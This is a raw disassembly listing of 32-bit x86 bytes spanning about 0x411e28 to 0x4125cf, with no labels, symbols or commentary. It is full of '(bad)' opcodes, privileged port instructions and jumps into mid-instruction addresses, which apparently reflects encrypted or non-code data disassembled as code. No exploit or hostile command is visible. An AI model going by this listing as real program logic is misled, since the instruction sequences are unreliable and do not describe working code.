  411e28:	dec    esi
  411e29:	sbb    dh,BYTE PTR [edx]
  411e2b:	ret    
  411e2c:	dec    eax
  411e2d:	pop    es
  411e2e:	popa   
  411e2f:	imul   ebp,DWORD PTR [eax+0x4dbdbe7c],0xffffffe2
  411e36:	pop    eax
  411e37:	lock fmul QWORD PTR [eax+ebx*8+0x1b]
  411e3c:	ins    BYTE PTR es:[edi],dx
  411e3d:	inc    eax
  411e3e:	xor    DWORD PTR [edi],ecx
  411e40:	inc    edi
  411e41:	adc    al,0xd8
  411e43:	mov    ds:0xcf852c76,eax
  411e48:	stc    
  411e49:	ds aam 0xc2
  411e4c:	ss in  al,dx
  411e4e:	pop    DWORD PTR ds:0xa0dac12b
  411e54:	jg     0x411e44
  411e56:	pop    esi
  411e57:	ins    DWORD PTR es:[edi],dx
  411e58:	pop    ds
  411e59:	out    dx,eax
  411e5a:	scas   eax,DWORD PTR es:[edi]
  411e5b:	xchg   BYTE PTR [ebp-0x71],dl
  411e5e:	pop    ss
  411e5f:	cmp    BYTE PTR [esi-0x76],al
  411e62:	pop    ebx
  411e63:	push   ss
  411e64:	dec    esp
  411e65:	std    
  411e66:	retf   
  411e67:	stos   BYTE PTR es:[edi],al
  411e68:	dec    ebp
  411e69:	and    cl,BYTE PTR [ebp-0x7072b45f]
  411e6f:	add    DWORD PTR [ecx],edi
  411e71:	ja     0x411e80
  411e73:	and    eax,0xd9cc1546
  411e78:	icebp  
  411e79:	mov    edx,0x8cdd9d1a
  411e7e:	sub    eax,ecx
  411e80:	mov    dh,0x33
  411e82:	mov    ch,0xd0
  411e84:	es clc 
  411e86:	xchg   esi,eax
  411e87:	and    esp,DWORD PTR [esi-0x19]
  411e8a:	int    0x46
  411e8c:	mov    DWORD PTR [esi-0x4e],esp
  411e8f:	inc    ecx
  411e90:	dec    ebx
  411e91:	adc    DWORD PTR [ebx+0x265a51f7],ebp
  411e97:	push   ecx
  411e98:	je     0x411efc
  411e9a:	inc    esi
  411e9b:	or     dh,dl
  411e9d:	dec    edx
  411e9e:	jmp    0x411ebe
  411ea0:	sbb    al,0xc6
  411ea2:	adc    eax,0xc5392356
  411ea7:	push   ecx
  411ea8:	popf   
  411ea9:	cmp    bl,dl
  411eab:	pop    esi
  411eac:	iret   
  411ead:	sahf   
  411eae:	ds mov eax,0xf3f296e8
  411eb4:	cmp    BYTE PTR [eax-0x31],0x2
  411eb8:	aaa    
  411eb9:	icebp  
  411eba:	inc    esi
  411ebb:	cwde   
  411ebc:	mov    ch,0xd0
  411ebe:	mov    ecx,0xbc9fe798
  411ec3:	gs call ebp
  411ec6:	mov    eax,ds:0xc358b8f8
  411ecb:	fcmovu st,st(4)
  411ecd:	dec    esp
  411ece:	test   eax,0x5f74ec1c
  411ed3:	or     esi,DWORD PTR [eax+eiz*8]
  411ed6:	clc    
  411ed7:	bound  edi,QWORD PTR [ecx+0x36]
  411eda:	dec    edi
  411edb:	pop    ecx
  411edc:	lds    esi,FWORD PTR [esp+edi*8]
  411edf:	rol    BYTE PTR [ecx+0x59],0x74
  411ee3:	outs   dx,DWORD PTR ds:[esi]
  411ee4:	push   edi
  411ee5:	data16 xor BYTE PTR [ebx+0xd109ded],cl
  411eec:	mov    ds:0x6912c201,eax
  411ef1:	xor    DWORD PTR [eax+0x5c],edx
  411ef4:	or     edx,ebp
  411ef6:	xchg   ecx,eax
  411ef7:	add    bl,BYTE PTR [eax+eiz*2-0x5334157]
  411efe:	das    
  411eff:	lock dec ecx
  411f01:	retf   
  411f02:	sbb    bl,dl
  411f04:	xchg   ebp,eax
  411f05:	xchg   DWORD PTR [eax+0x71],eax
  411f08:	sub    cl,bl
  411f0a:	mov    ebx,0x3bbadb5c
  411f0f:	ja     0x411ecc
  411f11:	push   0x560efe31
  411f16:	div    dl
  411f18:	cmp    bl,dl
  411f1a:	push   cs
  411f1b:	data16 clc 
  411f1d:	ins    DWORD PTR es:[edi],dx
  411f1e:	mov    eax,0xc11e7c4d
  411f23:	and    DWORD PTR [ebx+0x4e],esi
  411f26:	xor    al,0xd
  411f28:	dec    ebx
  411f29:	sbb    edi,eax
  411f2b:	ss es push 0x76efe987
  411f32:	mov    esi,DWORD PTR [esi+0x7d9d1b14]
  411f38:	adc    DWORD PTR [esi],edi
  411f3a:	es out dx,al
  411f3c:	add    eax,0xd266111
  411f41:	fsubr  DWORD PTR [esi+0x67]
  411f44:	int    0x1d
  411f46:	ins    BYTE PTR es:[edi],dx
  411f47:	shl    edi,0xb0
  411f4a:	shl    BYTE PTR [eax-0x2b55c9c5],1
  411f50:	sbb    al,0xce
  411f52:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411f53:	cs jb  0x411eff
  411f56:	add    ebx,DWORD PTR [ebx+edx*1]
  411f59:	xchg   esi,eax
  411f5a:	das    
  411f5b:	pusha  
  411f5c:	inc    edx
  411f5d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411f5e:	pop    ds
  411f5f:	in     eax,dx
  411f60:	xchg   ebp,eax
  411f61:	adc    eax,0xe588397d
  411f66:	iret   
  411f67:	test   BYTE PTR gs:[esi+0x13],dh
  411f6b:	pop    ss
  411f6c:	js     0x411f3c
  411f6e:	jle    0x411fb8
  411f70:	jmp    0x411f4b
  411f72:	mov    edi,0x7bcc0549
  411f77:	fwait
  411f78:	in     al,0x41
  411f7a:	pop    ecx
  411f7b:	jp     0x411fd7
  411f7d:	cli    
  411f7e:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  411f80:	mov    ebp,DWORD PTR [ecx+edi*1-0x29aa4b20]
  411f87:	fidiv  WORD PTR [esi+0x5e8bdc55]
  411f8d:	std    
  411f8e:	fidivr WORD PTR [esi+0x15c7d692]
  411f94:	mov    ch,0xe
  411f96:	add    ch,BYTE PTR [edx]
  411f98:	xor    bl,BYTE PTR [edx-0x1f47d531]
  411f9e:	pop    ds
  411f9f:	(bad)  
  411fa0:	iret   
  411fa1:	push   0xffffffaf
  411fa3:	push   cs
  411fa4:	lods   eax,DWORD PTR ds:[esi]
  411fa5:	or     eax,DWORD PTR [bp+di+0x7c39]
  411faa:	stos   BYTE PTR es:[edi],al
  411fab:	xlat   BYTE PTR ds:[ebx]
  411fac:	pop    es
  411fad:	in     al,dx
  411fae:	cmp    eax,0x70bdec57
  411fb3:	mov    al,BYTE PTR [esp+0x386a6016]
  411fba:	repz mov ebx,0x8325ee9d
  411fc0:	add    ch,0x34
  411fc3:	arpl   WORD PTR [edi-0x56f6036a],dx
  411fc9:	push   eax
  411fca:	mov    bl,0x3
  411fcc:	out    0x59,al
  411fce:	ret    0x4991
  411fd1:	fdivrp st(2),st
  411fd3:	inc    ecx
  411fd4:	sbb    BYTE PTR [esi],dh
  411fd6:	scas   eax,DWORD PTR es:[edi]
  411fd7:	push   eax
  411fd8:	jmp    0x3ee9a754
  411fdd:	add    dh,BYTE PTR [ebp+eax*1+0x22da2b72]
  411fe4:	bound  ebx,QWORD PTR [ebx]
  411fe6:	bswap  ebp
  411fe8:	fs int3 
  411fea:	test   DWORD PTR [esi+eiz*1],eax
  411fed:	inc    edx
  411fee:	repnz das 
  411ff0:	in     eax,dx
  411ff1:	test   DWORD PTR [eax-0x61],esp
  411ff4:	ds nop
  411ff6:	lods   al,BYTE PTR ds:[esi]
  411ff7:	shl    DWORD PTR [eax],1
  411ff9:	cmp    dl,cl
  411ffb:	add    BYTE PTR [eax],0xb9
  411ffe:	pop    ecx
  411fff:	jl     0x412038
  412001:	das    
  412002:	fucomp st(5)
  412004:	mov    edx,0x198556c5
  412009:	sbb    BYTE PTR [eax+0x192b2575],dl
  41200f:	fsub   st,st(0)
  412011:	cmp    bl,BYTE PTR [edx-0x15]
  412014:	and    DWORD PTR [eax-0x10],edi
  412017:	icebp  
  412018:	cmp    esi,DWORD PTR [ebx]
  41201a:	pop    edx
  41201b:	into   
  41201c:	cmp    esp,DWORD PTR [eax-0x5c45314e]
  412022:	test   esi,eax
  412024:	cmc    
  412025:	scas   eax,DWORD PTR es:[edi]
  412026:	cdq    
  412027:	push   0x50
  412029:	bound  eax,QWORD PTR [ebx+ebp*8-0x60d7a381]
  412030:	push   eax
  412031:	inc    ecx
  412032:	das    
  412033:	sub    al,0x80
  412035:	cmp    al,0xc4
  412037:	cmp    ebx,ebx
  412039:	pop    ebp
  41203a:	hlt    
  41203b:	lock mov BYTE PTR [esi+0x16150cd1],bl
  412042:	jl     0x4120b5
  412044:	inc    esp
  412045:	push   edx
  412046:	dec    esp
  412047:	jae    0x412029
  412049:	loope  0x411fd4
  41204b:	pop    ds
  41204c:	xchg   esi,eax
  41204d:	outs   dx,DWORD PTR ds:[esi]
  41204e:	test   eax,0xc95cd470
  412053:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412054:	and    BYTE PTR [esi-0xa],ch
  412057:	xchg   ebp,eax
  412058:	sahf   
  412059:	xchg   esi,eax
  41205a:	icebp  
  41205b:	lods   al,BYTE PTR ds:[esi]
  41205c:	xor    al,0xa2
  41205e:	add    DWORD PTR [esp+esi*1+0x5368a018],eax
  412065:	mov    ebx,0x82ef7d97
  41206a:	adc    cl,BYTE PTR [ebx-0x6]
  41206d:	adc    al,0x74
  41206f:	pop    esi
  412070:	cmp    cl,cl
  412072:	jle    0x412090
  412074:	out    0x36,al
  412076:	inc    esp
  412077:	sub    eax,edi
  412079:	push   ds
  41207a:	mov    esi,?
  41207c:	jnp    0x4120d3
  41207e:	(bad)  [edx]
  412080:	mov    esp,0x881a2925
  412085:	mov    DWORD PTR [esi-0x5a],ebx
  412088:	(bad)  
  41208a:	sub    ch,BYTE PTR [eax+0x79]
  41208d:	mov    cl,0x8e
  41208f:	sbb    ecx,DWORD PTR [ebp-0x52]
  412092:	in     eax,dx
  412093:	lahf   
  412094:	popa   
  412095:	pop    ebx
  412096:	shl    DWORD PTR [ecx-0x74],1
  412099:	outs   dx,DWORD PTR ds:[esi]
  41209a:	int3   
  41209b:	xchg   esp,eax
  41209c:	call   FWORD PTR [esi+0x2b]
  41209f:	das    
  4120a0:	xchg   edi,eax
  4120a1:	fcomp  DWORD PTR [eax+eiz*1-0xe0fc287]
  4120a8:	and    DWORD PTR ds:[esi+0x43],ebx
  4120ac:	aas    
  4120ad:	mov    esp,0x87a0b230
  4120b2:	or     DWORD PTR [edx],eax
  4120b4:	es ss js 0x4120d3
  4120b8:	sub    DWORD PTR [edx+0x4606f406],ebx
  4120be:	xor    al,0xdf
  4120c0:	dec    ebp
  4120c1:	iret   
  4120c2:	jp     0x4120b8
  4120c4:	lods   al,BYTE PTR ds:[esi]
  4120c5:	dec    esi
  4120c6:	fidiv  WORD PTR [ecx+0x75fb6cb1]
  4120cc:	shl    dh,1
  4120ce:	and    esi,DWORD PTR [edx-0x59]
  4120d1:	lahf   
  4120d2:	jp     0x4120da
  4120d4:	jmp    0x412057
  4120d6:	sub    DWORD PTR [ecx-0x56],edi
  4120d9:	pop    es
  4120da:	sbb    ebp,DWORD PTR [ecx+0x7961803e]
  4120e0:	in     eax,dx
  4120e1:	test   ah,bh
  4120e3:	pop    ecx
  4120e4:	mov    ecx,0x4230edfd
  4120e9:	test   al,0xef
  4120eb:	int    0xd3
  4120ed:	push   eax
  4120ee:	nop
  4120ef:	pop    esi
  4120f0:	pop    esp
  4120f1:	mov    BYTE PTR [ebp+0x57],ch
  4120f4:	xchg   esp,eax
  4120f5:	ins    BYTE PTR es:[edi],dx
  4120f6:	loop   0x41208f
  4120f8:	repnz push edi
  4120fa:	aas    
  4120fb:	repnz pop es
  4120fd:	pop    ebp
  4120fe:	(bad)  
  4120ff:	mov    esi,0x5bb0da05
  412104:	ins    BYTE PTR es:[edi],dx
  412105:	cmp    ah,BYTE PTR [ebx]
  412107:	popa   
  412108:	mov    eax,ds:0x69add16e
  41210d:	sub    ebx,DWORD PTR [edi+eax*1]
  412110:	mov    edx,0xa20e7ef5
  412115:	push   ss
  412116:	jno    0x412193
  412118:	xchg   ecx,eax
  412119:	sbb    al,0x34
  41211b:	imul   eax,ebp,0xa8f48e75
  412121:	icebp  
  412122:	xchg   ebp,eax
  412123:	jae    0x4120a7
  412125:	clc    
  412126:	mov    edx,0x767956e1
  41212b:	sahf   
  41212c:	push   ss
  41212d:	lods   al,BYTE PTR ds:[esi]
  41212e:	mov    esp,0x8cf029ee
  412133:	(bad)  
  412134:	cld    
  412135:	lds    ebp,FWORD PTR [edi+0x14bb6152]
  41213b:	sbb    DWORD PTR [ecx+edx*2-0x417f0666],edi
  412142:	pop    ss
  412143:	popa   
  412144:	jae    0x4120d4
  412146:	dec    esi
  412147:	pop    edi
  412148:	idiv   BYTE PTR ds:[edi+0x9]
  41214c:	outs   dx,BYTE PTR ds:[esi]
  41214d:	enter  0xa07b,0xc2
  412151:	xor    ebx,eax
  412153:	ins    BYTE PTR es:[edi],dx
  412154:	and    edi,DWORD PTR [edx-0x4c]
  412157:	repnz sub al,BYTE PTR [ebp+0x358c597]
  41215e:	out    dx,al
  41215f:	(bad)  
  412160:	mov    bh,0xf0
  412163:	(bad)  
  412165:	or     ah,dl
  412167:	jmp    0x23f:0x68e862fa
  41216e:	or     al,0xf2
  412170:	jmp    0xedab:0x7e9329a
  412177:	jnp    0x412149
  412179:	sub    esp,DWORD PTR [edi+0x54]
  41217c:	enter  0x8997,0x75
  412180:	in     al,dx
  412181:	push   ds
  412182:	pop    esi
  412183:	repnz mov esi,0x6bd4e1e
  412189:	mov    edx,0xead62dd9
  41218e:	daa    
  41218f:	ins    DWORD PTR es:[edi],dx
  412190:	ins    DWORD PTR es:[edi],dx
  412191:	push   eax
  412192:	inc    esp
  412193:	push   0x7f
  412195:	(bad)  
  412196:	out    dx,al
  412197:	rcr    BYTE PTR [edx+0x41],0x8c
  41219b:	inc    edi
  41219c:	mov    bh,0xe4
  41219e:	jb     0x4121d8
  4121a0:	dec    ebp
  4121a1:	push   ecx
  4121a2:	and    al,0x1
  4121a4:	int3   
  4121a5:	out    0xd,eax
  4121a7:	inc    ebx
  4121a8:	aaa    
  4121a9:	pop    eax
  4121aa:	ret    
  4121ab:	test   BYTE PTR [ebx+0x61],bl
  4121ae:	adc    edi,DWORD PTR [ebx]
  4121b0:	inc    esp
  4121b1:	xchg   DWORD PTR [ecx],esp
  4121b3:	mov    BYTE PTR [ebx-0x59],al
  4121b6:	rcr    BYTE PTR [edi+0xcaef27c],0x82
  4121bd:	ret    
  4121be:	push   cs
  4121bf:	inc    esp
  4121c0:	test   DWORD PTR [edx+0x40],ebp
  4121c3:	jae    0x4121ad
  4121c5:	loopne 0x412148
  4121c7:	mov    bh,ch
  4121c9:	ret    
  4121ca:	arpl   WORD PTR [esi+0x6c],bx
  4121cd:	dec    esp
  4121ce:	sub    esi,esi
  4121d0:	pop    ebp
  4121d1:	xchg   esp,eax
  4121d2:	mov    DWORD PTR [edx+eiz*1+0x3f],ebp
  4121d6:	(bad)  
  4121d7:	rcr    DWORD PTR [esi-0x4b],cl
  4121da:	repz or BYTE PTR [ebx+0x694d0a81],al
  4121e1:	push   eax
  4121e2:	call   0x8fd3cb6c
  4121e7:	add    ch,BYTE PTR [ecx-0x17f1f365]
  4121ed:	xor    al,0x2a
  4121ef:	fld    st(3)
  4121f1:	fcom   st(3)
  4121f3:	mov    al,0x7e
  4121f5:	aam    0xe5
  4121f7:	js     0x412237
  4121f9:	ficomp DWORD PTR [eax+esi*1+0x7695e474]
  412200:	stos   DWORD PTR es:[edi],eax
  412201:	mov    bh,bh
  412203:	scas   eax,DWORD PTR es:[edi]
  412204:	aas    
  412205:	xlat   BYTE PTR ds:[ebx]
  412206:	mov    esi,DWORD PTR [edx]
  412208:	clc    
  412209:	and    eax,0xc33f572c
  41220e:	mov    ch,0xee
  412210:	shr    BYTE PTR [edi+0x6b7852d],0x36
  412217:	xchg   esp,eax
  412218:	nop
  412219:	push   edi
  41221a:	or     ebx,DWORD PTR [edi+0x3a]
  41221d:	cdq    
  41221e:	push   eax
  41221f:	jno    0x4121a5
  412221:	call   0xce013b5d
  412226:	cmc    
  412227:	sar    ebx,cl
  412229:	imul   ecx,DWORD PTR [esi+0x54],0x93b027fd
  412230:	shl    BYTE PTR [ebx+0x5d],1
  412233:	inc    ecx
  412234:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412235:	out    0x63,eax
  412237:	push   cs
  412238:	sub    eax,0x10c575ea
  41223d:	std    
  41223e:	push   ebx
  41223f:	mov    ebp,0x3de3b55e
  412244:	sti    
  412245:	adc    edx,DWORD PTR [eax-0x8947142]
  41224b:	cmp    edi,DWORD PTR [ebp+0x4f45bdb3]
  412251:	cmp    DWORD PTR [edi-0x345f57b9],eax
  412257:	add    esi,DWORD PTR [ecx+edi*4+0x4e]
  41225b:	loopne 0x412236
  41225d:	push   ecx
  41225e:	xchg   ebp,eax
  41225f:	or     al,0x7c
  412261:	sub    eax,0xb60713dc
  412266:	jmp    0x412207
  412268:	int    0xfc
  41226a:	xchg   ebp,eax
  41226b:	fild   WORD PTR [edi-0x176e1fa9]
  412271:	xor    BYTE PTR [edx-0xf],bl
  412274:	xchg   DWORD PTR [ebx+0x6c],esi
  412277:	scas   eax,DWORD PTR es:[edi]
  412278:	jg     0x4122cc
  41227a:	loop   0x41221d
  41227c:	gs mov bl,0x22
  41227f:	into   
  412280:	mov    dh,BYTE PTR [edi]
  412282:	xor    eax,0x99c99fc7
  412287:	jne    0x4122bb
  412289:	jo     0x41220c
  41228b:	xchg   ecx,eax
  41228c:	test   BYTE PTR [esi-0x25],ah
  41228f:	fsub   QWORD PTR [edx+0x5ac6b1cd]
  412295:	cdq    
  412296:	bound  esi,QWORD PTR [ebx-0x12]
  412299:	js     0x4122e4
  41229b:	aad    0xff
  41229d:	cmp    eax,0x8671ba08
  4122a2:	inc    eax
  4122a3:	scas   eax,DWORD PTR es:[edi]
  4122a4:	mov    dl,0xc3
  4122a6:	cmp    al,BYTE PTR [esi]
  4122a8:	jne    0x4122c3
  4122aa:	lock dec esp
  4122ac:	repnz sub DWORD PTR [ebp-0x41],ecx
  4122b0:	in     al,0x63
  4122b2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4122b3:	adc    BYTE PTR [ecx+0x77],al
  4122b6:	bound  ebx,QWORD PTR [edi+0x3e]
  4122b9:	loopne 0x41231d
  4122bb:	pop    esi
  4122bc:	sbb    esp,DWORD PTR [ebx]
  4122be:	retf   
  4122bf:	mov    WORD PTR [edx-0x2a1db41f],cs
  4122c5:	mov    cs:0x27d2573,eax
  4122cb:	out    0xf6,al
  4122cd:	retf   0x6d3e
  4122d0:	ret    
  4122d1:	out    dx,al
  4122d2:	xchg   ebx,eax
  4122d3:	ins    BYTE PTR es:[edi],dx
  4122d4:	dec    eax
  4122d5:	mov    ebp,0x3afa0144
  4122da:	fwait
  4122db:	inc    ebx
  4122dc:	in     al,0x3c
  4122de:	inc    ecx
  4122df:	rcl    eax,1
  4122e1:	add    edx,esp
  4122e3:	jle    0x41234d
  4122e5:	adc    ecx,DWORD PTR [eax-0x3436add7]
  4122eb:	cmc    
  4122ec:	dec    edx
  4122ed:	mov    ah,0x52
  4122ef:	jecxz  0x4122e2
  4122f1:	jnp    0x412353
  4122f3:	or     dh,al
  4122f5:	clc    
  4122f6:	push   DWORD PTR [eax-0xdb7e147]
  4122fc:	cmp    al,0x9e
  4122fe:	inc    esp
  4122ff:	dec    edx
  412300:	fld    DWORD PTR [ebx+0x44]
  412303:	ret    
  412304:	cwde   
  412305:	jnp    0x412311
  412307:	(bad)  
  412309:	cmc    
  41230a:	call   0x208b4b24
  41230f:	adc    al,0x7c
  412311:	outs   dx,BYTE PTR ds:[esi]
  412312:	cmp    DWORD PTR [ecx-0x12],edi
  412315:	mov    eax,0xe779756a
  41231a:	dec    eax
  41231b:	jg     0x4122d1
  41231d:	add    BYTE PTR [eax],dl
  41231f:	mov    ds:0x5b16a52a,al
  412324:	and    esi,0x2f9dbe
  41232a:	arpl   bx,di
  41232c:	jmp    0x6846:0x607c78fa
  412333:	xchg   esp,eax
  412334:	jmp    esp
  412336:	push   esp
  412337:	rcr    BYTE PTR [ebp+0x26],1
  41233a:	lods   al,BYTE PTR ds:[esi]
  41233b:	mov    esp,0xfc74e3cb
  412340:	jnp    0x41230d
  412342:	outs   dx,DWORD PTR ds:[esi]
  412343:	inc    eax
  412344:	retf   0xc13
  412347:	mov    al,0xee
  412349:	in     al,dx
  41234a:	fidivr DWORD PTR [esi]
  41234c:	or     eax,0x2ca874e2
  412351:	aam    0xb5
  412353:	jo     0x412387
  412355:	inc    eax
  412356:	sbb    DWORD PTR [edx],ecx
  412358:	icebp  
  412359:	in     eax,0xda
  41235b:	mov    edi,0x38cb7c46
  412360:	dec    ebp
  412361:	arpl   WORD PTR [esi],ax
  412363:	add    dh,ah
  412365:	pop    esi
  412366:	pop    ebp
  412367:	xchg   ebp,eax
  412368:	mov    ch,ch
  41236a:	(bad)  
  41236c:	or     esi,DWORD PTR [ebx-0x5a1e2a12]
  412372:	(bad)  
  412373:	mov    ebp,0xa3d12dbd
  412378:	push   edx
  412379:	mov    ds:0x1b13d178,al
  41237e:	push   0x3
  412380:	inc    edi
  412381:	pushf  
  412382:	sbb    ch,BYTE PTR [edi-0x5f]
  412385:	lods   al,BYTE PTR ds:[esi]
  412386:	xchg   BYTE PTR [edx+0x5e],dh
  412389:	icebp  
  41238a:	jno    0x412337
  41238c:	xchg   ebx,eax
  41238d:	daa    
  41238e:	push   ss
  41238f:	lea    esp,[eax-0x19]
  412392:	and    al,0xd2
  412394:	push   ebx
  412395:	push   cs
  412396:	sar    DWORD PTR [ecx+0x4287559b],0x0
  41239d:	gs cmp al,0x63
  4123a0:	(bad)
  4123a3:	push   ebx
  4123a4:	or     BYTE PTR [eax],0x4d
  4123a7:	and    DWORD PTR [ebp+0x63],edx
  4123aa:	fcomp  st(5)
  4123ac:	mov    ebx,0x2e6896e5
  4123b1:	xchg   esi,eax
  4123b2:	aaa    
  4123b3:	jns    0x412365
  4123b5:	(bad)  
  4123b6:	jecxz  0x4123de
  4123b8:	loopne 0x412435
  4123ba:	rcr    edx,0xb2
  4123bd:	lock aas 
  4123bf:	inc    esp
  4123c0:	add    eax,0xb68a9cb9
  4123c5:	repz dec ecx
  4123c7:	nop
  4123c8:	neg    DWORD PTR [edx+0x1d57f91b]
  4123ce:	imul   edi,esp,0xffffffb1
  4123d1:	and    ebx,DWORD PTR [edx]
  4123d3:	sub    eax,0x2d4bea7b
  4123d8:	cdq    
  4123d9:	pop    eax
  4123da:	cld    
  4123db:	push   ebx
  4123dc:	loop   0x41240b
  4123de:	repz out 0x65,al
  4123e1:	test   al,0x88
  4123e3:	std    
  4123e4:	(bad)  
  4123e5:	lock adc al,0x41
  4123e8:	xor    esi,DWORD PTR [edx-0x716cbf58]
  4123ee:	pop    ecx
  4123ef:	mov    bh,al
  4123f1:	and    esp,DWORD PTR [eax+0xd755e14]
  4123f7:	int3   
  4123f8:	mov    ebx,0x9fe7a985
  4123fd:	mov    DWORD PTR [esi+0x74],0x8bd8ea4f
  412404:	cmp    eax,0x5bb8df86
  412409:	or     al,0x8b
  41240b:	xchg   ebx,eax
  41240c:	lea    ecx,[esp+eax*8]
  41240f:	dec    ebp
  412410:	in     eax,0x21
  412412:	(bad)  
  412413:	ss pop es
  412415:	jle    0x412405
  412417:	stos   BYTE PTR es:[edi],al
  412418:	fiadd  DWORD PTR [ecx-0x59]
  41241b:	imul   ecx,DWORD PTR [eax+0x1e],0x2916c619
  412422:	repz xor cl,BYTE PTR [esi]
  412425:	sbb    DWORD PTR [ebp-0xc3fb2a8],0x40
  41242c:	or     eax,0x18d57c38
  412431:	add    BYTE PTR [esp+ecx*4+0x7e141b68],al
  412438:	cmp    eax,0xce09aa1a
  41243d:	mov    ebx,0x74904607
  412442:	sbb    BYTE PTR [ecx-0xe],ah
  412445:	out    dx,al
  412446:	out    dx,eax
  412447:	and    BYTE PTR [esi],bl
  412449:	sbb    dh,0x97
  41244c:	fmul   QWORD PTR [esi]
  41244e:	xchg   ebx,eax
  41244f:	or     bl,dl
  412451:	outs   dx,DWORD PTR ds:[esi]
  412452:	mov    bl,cl
  412454:	repz imul ecx,DWORD PTR [edi-0x2fc4978f],0xc65c07b
  41245f:	push   edx
  412460:	cmp    edx,edx
  412462:	jae    0x412484
  412464:	bnd je 0x4124c1
  412467:	jmp    0x444d50aa
  41246c:	clc    
  41246d:	or     DWORD PTR ds:0x52da25cf,esi
  412473:	hlt    
  412474:	rol    BYTE PTR [esi+0x49cc8fe1],1
  41247a:	xchg   ebp,eax
  41247b:	xor    BYTE PTR [ebp-0x3a9b62a],ch
  412481:	imul   edi,DWORD PTR [edx],0x2e662b3a
  412487:	imul   DWORD PTR [eiz*8+0x18c3641c]
  41248e:	inc    ecx
  41248f:	leave  
  412490:	cmp    DWORD PTR [edi+ebp*4+0x62],edx
  412494:	inc    esp
  412495:	daa    
  412496:	xchg   edx,eax
  412497:	lods   eax,DWORD PTR gs:[esi]
  412499:	push   edx
  41249a:	mov    WORD PTR [edi-0x45],gs
  41249d:	push   eax
  41249e:	mov    esi,0x2da96168
  4124a3:	mov    ds:0xfab77e4,al
  4124a8:	push   esp
  4124a9:	fld    TBYTE PTR [ecx+edi*2+0x10dc0397]
  4124b0:	js     0x4124ce
  4124b2:	iretw  
  4124b4:	gs ins BYTE PTR es:[edi],dx
  4124b6:	rol    ah,1
  4124b8:	je     0x4124f3
  4124ba:	or     al,ah
  4124bc:	inc    ebp
  4124bd:	xchg   ebx,eax
  4124be:	ins    DWORD PTR es:[edi],dx
  4124bf:	test   eax,0x66e466bb
  4124c4:	mov    DWORD PTR [eax+ebx*4+0x4d],0x35498c63
  4124cc:	stc    
  4124cd:	imul   ebx,ebx,0xa8c696cd
  4124d3:	fidiv  WORD PTR [ebx-0x77]
  4124d6:	retf   0x7f83
  4124d9:	into   
  4124da:	bound  esp,QWORD PTR [esi+0xdb1005f]
  4124e0:	inc    eax
  4124e1:	inc    ebx
  4124e2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4124e3:	push   edx
  4124e4:	jecxz  0x412528
  4124e6:	out    dx,al
  4124e7:	loope  0x4124e5
  4124e9:	cs into 
  4124eb:	add    esi,DWORD PTR [ebx]
  4124ed:	or     eax,0x3cee75b
  4124f2:	rol    bl,0xd7
  4124f5:	jbe    0x412531
  4124f7:	jb     0x41255e
  4124f9:	mov    WORD PTR [esi-0x6e14578c],gs
  4124ff:	bound  edi,QWORD PTR [edi]
  412501:	mov    eax,ds:0x4fd0fbe6
  412506:	add    DWORD PTR [ebx],ebp
  412508:	or     BYTE PTR [edi+0x20],0x36
  41250c:	sub    BYTE PTR [edx-0x7f7f41d5],bh
  412512:	xchg   esp,eax
  412513:	ds loopne 0x4124b0
  412516:	in     eax,0xcc
  412518:	jnp    0x41254b
  41251a:	sbb    BYTE PTR [esi-0x11],dh
  41251d:	scas   al,BYTE PTR es:[edi]
  41251e:	dec    eax
  41251f:	xor    al,0x59
  412521:	aas    
  412522:	jbe    0x412516
  412524:	cmp    eax,0xea34f3f9
  412529:	inc    ecx
  41252a:	pmuludq mm6,QWORD PTR [eax]
  41252d:	push   esi
  41252e:	dec    eax
  41252f:	mov    esi,DWORD PTR [ebp-0x1fbf93fa]
  412535:	fidiv  DWORD PTR [edi-0x7686a8ef]
  41253b:	lods   al,BYTE PTR ds:[esi]
  41253c:	xor    BYTE PTR [edi],0xf8
  41253f:	pop    edx
  412540:	inc    edi
  412541:	inc    esp
  412542:	sbb    bl,BYTE PTR [ecx]
  412544:	shr    BYTE PTR [ebx-0x1fc715b],1
  41254a:	or     cl,ch
  41254c:	popf   
  41254d:	xchg   esi,eax
  41254e:	repz loopne 0x4124ee
  412551:	dec    ecx
  412552:	push   0xe05dbe96
  412557:	sbb    esi,DWORD PTR [esi-0xb]
  41255a:	retf   
  41255b:	xor    BYTE PTR [ecx],cl
  41255d:	mov    ebx,0x5af2d400
  412562:	mov    ds:0xbdcd5295,eax
  412567:	rol    DWORD PTR [ebx+ecx*8-0x16],1
  41256b:	or     BYTE PTR [edx-0x76],cl
  41256e:	xchg   ecx,eax
  41256f:	dec    esi
  412570:	xlat   BYTE PTR ds:[ebx]
  412571:	push   es
  412572:	ja     0x412586
  412574:	cdq    
  412575:	lea    eax,[ebx-0x60]
  412578:	push   es
  412579:	pop    es
  41257a:	pop    ebx
  41257b:	pop    ebx
  41257c:	(bad)  
  41257f:	mov    BYTE PTR [edx],ch
  412581:	bound  ebx,QWORD PTR [edi-0x2ebdfd79]
  412587:	daa    
  412588:	addr16 dec ecx
  41258a:	arpl   dx,si
  41258c:	ja     0x4125ee
  41258e:	jbe    0x412549
  412590:	cmp    DWORD PTR ds:0xce0dd180,0xccecab21
  41259a:	lahf   
  41259b:	jmp    0xa5d1ec12
  4125a0:	mov    WORD PTR [ebp+esi*2-0x2d],?
  4125a4:	rol    DWORD PTR [ebp+ebp*8-0x32],1
  4125a8:	or     DWORD PTR [edi],0x285146ee
  4125ae:	cmp    ah,BYTE PTR [edi-0x60e5d6a4]
  4125b4:	cmc    
  4125b5:	ins    DWORD PTR es:[edi],dx
  4125b6:	dec    esp
  4125b7:	jno    0x4125fa
  4125b9:	je     0x4125a8
  4125bb:	push   edx
  4125bc:	jg     0x4125a0
  4125be:	addr16 fxtract 
  4125c1:	in     eax,0x4d
  4125c3:	inc    ebp
  4125c4:	stc    
  4125c5:	dec    ebp
  4125c6:	jecxz  0x412646
  4125c8:	scas   eax,DWORD PTR es:[edi]
  4125c9:	and    ecx,eax
  4125cb:	dec    esp
  4125cc:	adc    ah,ah
  4125ce:	dec    ebx
  4125cf:	iret   
